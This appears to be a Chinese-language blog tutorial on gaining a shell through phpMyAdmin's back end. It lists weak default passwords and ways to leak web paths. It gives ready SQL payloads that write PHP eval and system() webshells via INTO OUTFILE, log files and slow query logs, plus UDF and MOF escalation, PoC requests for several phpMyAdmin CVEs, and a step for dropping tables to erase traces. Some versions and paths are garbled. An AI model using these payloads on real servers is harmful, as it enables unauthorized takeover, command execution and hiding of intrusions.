---
title: "phpmyadmin后台getshell及漏洞利用"
categories: [ "安全技术" ]
tags: [ "webshell","漏洞利用","phpmyadmin","getshell" ]
draft: false
slug: "496"
date: "2020-02-13 11:08:00"
---

## 事情起因

前面我也写过关于`phpmyadmin`后台弱密码爆破的文章

那么得到`phpmyadmin`后台登录权限之后，该如何给服务器写入一个`shell`好让我们进一步操作呢？

## 环境配置

**phpMyAdmin 的漏洞多为经过验证后的才能利用，所以需要进入后台**

进入后台的方法可以是:

- 弱密码：root/root,root/空，mysql/mysql
- 爆破：参考我之前写过的 phpmyadmin 爆破文章
- 目录泄露

环境使用的是`phpstudy`的`2018`版本，原来爆出过有漏洞，已经修复

![][1]

- Apache/2.4.23
- PHP/5.4.45
- MySQL/5.5.53

## 需要的条件

这里只是列出来所有可能用到的权限，不是所有写入方式都需要所有权限

### 绝对路径

物理路径

```
select version();  -- 查看数据库版本
select @@datadir;  -- 查看数据库存储路径
show VARIABLES like '%char%';  -- 查看系统变量
```

![][2]

也可以通过`log`变量得到：

![][3]

`phpinfo()`页面：最理想的情况，直接显示 web 路径

利用`select load_file()`读取文件找到`web`路径：

可以尝试`/etc/passwd`，`apache|nginx|httpd log`之类的文件。

配置文件爆路径：如果注入点有文件读取权限，可通过 load_file 尝试读取配置文件

```
# Windows
 c:\windows\php.ini                             # php配置文件
 c:\windows\system32\inetsrv\MetaBase.xml       # IIS虚拟主机配置文件
  # Linux
 /etc/php.ini                                   # php配置文件
 /etc/httpd/conf.d/php.conf
 /etc/httpd/conf/httpd.conf                     # Apache配置文件
 /usr/local/apache/conf/httpd.conf
 /usr/local/apache2/conf/httpd.conf
 /usr/local/apache/conf/extra/httpd-vhosts.conf # 虚拟目录配置文件
```

单引号爆路径：直接在 URL 后面加单引号。要求单引号没有被过滤(`gpc=off`)且服务器默认返回错误信息。

```
www.abc.com/index.php?id=1'
```

错误参数值爆路径：尝试将要提交的参数值改成错误值。

```
www.abc.com/index.php?id=-1
```

`Nginx`文件类型错误解析爆路径：要求`Web`服务器是`Nginx`，且存在文件类型解析漏洞。

在图片地址后添加`/x.php`，该图片不但会被当作`php`文件执行，还有可能爆出物理路径。

```
www.abc.com/bg.jpg/x.php
```

`Google`爆路径:

```
site:xxx.com warning
site:xxx.com “fatal error”
```

测试文件爆路径:

```
www.xxx.com/test.php
www.xxx.com/ceshi.php
www.xxx.com/info.php
www.xxx.com/phpinfo.php
www.xxx.com/php_info.php
www.xxx.com/1.php
```

其它

```
phpMyAdmin/libraries/selectlang.lib.php
phpMyAdmin/darkblueorange/layout.inc.php
phpmyadmin/themes/darkblue_orange/layout.inc.php
phpMyAdmin/index.php?lang[]=1
phpMyAdmin/darkblueorange/layout.inc.php phpMyAdmin/index.php?lang[]=1
/phpmyadmin/libraries/lect_lang.lib.php
/phpMyAdmin/phpinfo.php
/phpmyadmin/themes/darkblue_orange/layout.inc.php
/phpmyadmin/libraries/select_lang.lib.php
/phpmyadmin/libraries/mcrypt.lib.php
```

### 账户是否有读写权限

如果遇到写入`shell`时报错，也可以检测以下用户权限:

```
select * from mysql.user;                //查询所有用户权限
select * from mysql.user where user="root";        //查询root用户权限
update user set File_priv ='Y' where user = 'root';      //允许root用户读写文件
update user set File_priv ='N' where user = 'root';      //禁止root用户读写文件
flush privileges;                    //刷新MySQL系统权限相关表
```

![][4]

### 路径是否具有读写权限

#### secure_file_priv 权限

```
select @@secure_file_priv;   -- 查询secure_file_priv
 -- secure_file_priv=NULL,禁止导入导出
 -- secure_file_priv='',不限制导入导出，Linux下默认/tmp目录可写
 -- secure_file_priv=/path/,只能向指定目录导入导出
```

> 在`my.ini`、`my.cnf`、`mysqld.cnf`文件中找到`secure_file_prive`并将其值设置为""或"/"，重启 MySQL 服务！

这是通用方法，在`phpstudy`中的`mysql`的配置文件中是没有这个参数的

所以我们自己在配置文件中添加一行`secure_file_priv =`即可。

![][5]

![][6]

重启`mysql`再次查看：

![][7]

#### 日志读写权限

查看日志状态：

```
show variables  like  '%general%';
```

![][8]

开启`general`时，所执行的`sql`语句都会出现在**\*\*\***.log 文件。

那么，如果修改`general_log_file`的值，所执行的`sql`语句会生成`shell`

开启日志读写:

```
SET GLOBAL general_log='on'
```

![][9]

### 其他权限

`magic_quotes_gpc`：开启时，会对'单引号进行转义，使其变成`\`反斜杠。

## getshell

### 常规 getshell

需要的条件是：

- 当前的数据库用户有写权限
- 知道 web 绝对路径
- web 路径能写

使用:

```
select '<?php @eval($_POST[soap]);?>' into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\config.php';
```

![][10]

注意，如果是在`phpmyadmin`的`sql`语句中执行写入的话，路径只能是斜杠/或者双反斜杠\\

如果报错提示`Can't create/write to file 'xxx/xxx/xxx.php' (Errcode: 13)`

证明目录不可写，可以尝试网站下其他目录， 如:

- /upload
- /templates
- /cache

写入中文路径`shell`:

```
set character_set_client='gbk';set character_set_connection='gbk';set character_set_database='gbk';set character_set_results='gbk';set character_set_server='gbk';select '<?php eval($_POST[soap]);?>' into outfile 'C:\\phpStudy\\WWW\\测试\\config.php';
```

蚁剑连接：`http://192.168.1.7/config.php`，密码：`soap`

![][11]

![][12]

还可以这样利用：

```
select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\test.php';
```

访问链接：`http://192.168.1.7/test.php?cmd=net user`

![][13]

![][14]

在有注入点的地方也可以这样使用：

```
id=1) into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\settings.php' fields terminated by '<?php @eval($_POST[]);?>'
```

### 建表 getshell

直接`phpmyadmin`里操作也可以，或者直接`sql`语句建表:

```
CREATE TABLE `mysql`.`soapffz` (`content` TEXT NOT NULL );
INSERT INTO `mysql`.`soapffz` (`content` ) VALUES ('<?php @eval($_POST[soap]);?>');
SELECT `content` FROM `mysql`.`soapffz` INTO OUTFILE 'C:\\phpstudy\\PHPTutorial\\WWW\\test3.php';
或者
Create TABLE soapffz (content text NOT NULL);
Insert INTO soapffz (content) VALUES('<?php @eval($_POST[pass]);?>');
select `content` from mysql.soapffz into outfile 'C:\\phpstudy\\PHPTutorial\\WWW\\test3.php';
然后删除所建的表抹去痕迹
DROP TABLE IF EXISTS `mysql`.`soapffz`;
```

![][15]

`shell`连接即可

### 日志 getshell

需要的条件：

- 日志记录开启
- web 绝对路径

实际执行的操作：

- 修改日志文件为 webshell

#### 通过写入日志文件 getshell

注意，通过：

```
show global variables like "%genera%";
set global general_log='on';
```

操作设置的目录开启的操作在重启`phpstudy`后会失效

指定日志文件:

```
set global general_log_file = "C:/phpstudy/PHPTutorial/WWW/test2.php";
```

写入执行代码：

```
SELECT '<?php eval($_POST["soap"]);?>'
```

#### 通过慢查询写入 shell

查看当前慢查询日志目录：

```
show variables like '%slow%';
```

![][16]

重新设置路径：

```
set GLOBAL slow_query_log_file='C:/phpstudy/PHPTutorial/WWW/slow.php';
```

开启慢查询日志：

```
set GLOBAL slow_query_log=on;
```

执行写入日志：

```
select '<?php eval($_POST["soap"]);?>' from mysql.db where sleep(10);
```

### User defined funct ion（UDF）

适用于`Windows`和`Linux`环境

需要的条件：

- 具有写权限
- 插件目录可写（或者可以更改指定的插件目录）。

具体情况要看目标 mysql 的版本：

- Mysql version > 5.1 时，dll 或者 so 必须位于 mysql 安装目录 lib\plugin 下，当对该目录具有写权限时可以利用，查看：
  `show variables like %plugin%；`// 查看插件目录
- 5.0 <= Mysql version <5.1 时，需要导出至目标服务器的系统目录，如 C://Windows/System32
- Mysql version < 5.0 时，目录可以自定义具体利用如下：

根据目标`mysql`版本写入特定目录的`so`或者`dll`，可以参考`sqlmap`里面的

```
select 'It is dll' into dumpfile 'C:\Program Files\MySQL\MySQL Server 5.1\l ib\plugin\lib_mysqludf_sys.dll';
```

创建对应的 function：

```
create function sys_eval returns string soname "lib_mysqludf_sys.dll";
```

执行命令：

```
select * from mysql.func where name = 'sys_eval'; #查看创建的sys_eval函数
select sys_eval('whoami'); #使用系统命令
```

### MOF 提权

通过`mysql`将文件写入一个`MOF`文件替换掉原有的`MOF`文件，然后系统每隔五秒就会执行一次上传的`MOF`。

一般适用于`Windows <= 2003`，并且`C:\Windows\System32\mof`目录具有写权限（一般是没有权限写）。

可以使用`MSF`直接利用：`exploit/windows/mysql/mysql_mof`

### 特殊版本 getshell

```
CVE-2013-3238
影响版本：3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3 ANYUN.ORG
利用模块：exploit/multi/http/phpmyadminpregreplace
CVE-2012-5159
影响版本：phpMyAdmin v3.5.2.2
利用模块：exploit/multi/http/phpmyadmin3522_backdoor
CVE-2009-1151
PhpMyAdmin配置文件/config/config.inc.php存在命令执行
影响版本：2.11.x < 2.11.9.5 and 3.x < 3.1.3.1
利用模块：exploit/unix/webapp/phpmyadmin_config
弱口令&万能密码
弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码
万能密码：版本2.11.3 / 2.11.4，用户名'localhost'@'@"则登录成功
```

## phpmyadmin 漏洞利用

`WooYun-2016-1994 33`：任意文件读取漏洞

影响 phpMyAdmin`2.x`版本，`poc`如下：

```
POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded Content-Length: 80
action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
```

`CVE-2014 -8959`：本地文件包含

影响范围：`phpMyAdmin 4 .0.1--4 .2.12`，需要`PHP version < 5.3.4` ，`Poc`如下：

```
/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=
/../../../../phpinfo.txt%00    # 注意改下token值
```

在实际利用中可以利用写入文件到`/tmp`目录下结合此漏洞完成`RCE`，`php`版本可以通过`http header`、

导出表内容到文件的附加内容看到。

`CVE-2016-5734` ：后台`RCE`

影响范围：PhpMyAdmin`4 .0.x-4 .6.2`，需要`PHP 4 .3.0-5.4 .6 versions`，利用如下：

```
cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
```

`CVE-2018-1261`：后台文件包含

`phpMyAdmin 4 .8.0`和`4 .8.1`，经过验证可实现任意文件包含。利用如下：

执行`SQL`语句，将`PHP`代码写入`Session`文件中：

```
select '<?php phpinfo();exit;?>'
```

包含`session`文件：

```
http://10.1.1.10/index.php?target=db_sql.php%253f/../../../../../../../../var/l ib/php/sessions/sess_*** # *** 为phpMyAdmin的COOKIE值
```

`CVE-2018-19968`：任意文件包含`/RCE`

`phpMyAdmin 4 .8.0~4 .8.3`，利用如下：

创建数据库，并将`PHP`代码写入`Session`文件中:

```
CREATE DATABASE foo;
CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';
```

生成`foo`数据库的`phpMyAdmin`的配置表，访问：

```
http://10.1.1.10/chk_rel.php?fixall_pmadb=1&db=foo
```

篡改数据插入`pma column_info`中：

```
INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_***','plop'; # *** 为phpMyAdmin 的COOKIE值
```

这里要注意不用系统的`session`保存位置不同，具体系统可以在`phpMyAdmin`登录后首页看到

`MacOS`：`/var/tmp`
`Linux`：`/var/lib/php/sessions`
`phpStudy`：`/phpstudy/PHPTutorial/tmp/tmp`

访问包含`Session`文件的地址：

```
http://10.1.1.10/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[ multi_edit][][]=baz&clause_is_unique=1
```

参考文章：

- [phpMyAdmin 渗透利用总结][17]
- [phpmyadmin getshell 之利用日志文件][18]
- [phpMyAdmin 后台 GetShell 实战应用][19]
- [phpMydmin 的 GetShell 思路][20]

[1]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_111241.png
[2]: https://img.soapffz.com/archives_img/2020/02/13/https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_112857.png
[3]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_125442.png
[4]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_132709.png
[5]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_131046.png
[6]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_131258.png
[7]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_131352.png
[8]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_130356.png
[9]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_130718.png
[10]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_133321.png
[11]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_134455.png
[12]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_134522.png
[13]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_135233.png
[14]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_135252.png
[15]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_142449.png
[16]: https://img.soapffz.com/archives_img/2020/02/13/archives_20200213_143545.png
[17]: https://mp.weixin.qq.com/s/9Tkcn2AtGrHUsIbRCQ-ZSQ
[18]: https://mp.weixin.qq.com/s/Y1ZtcQ-VuIh89RDcYoD3hQ
[19]: https://mp.weixin.qq.com/s/IWjGPQ155kZnUxh5fjb1RQ
[20]: https://www.freebuf.com/articles/web/226240.html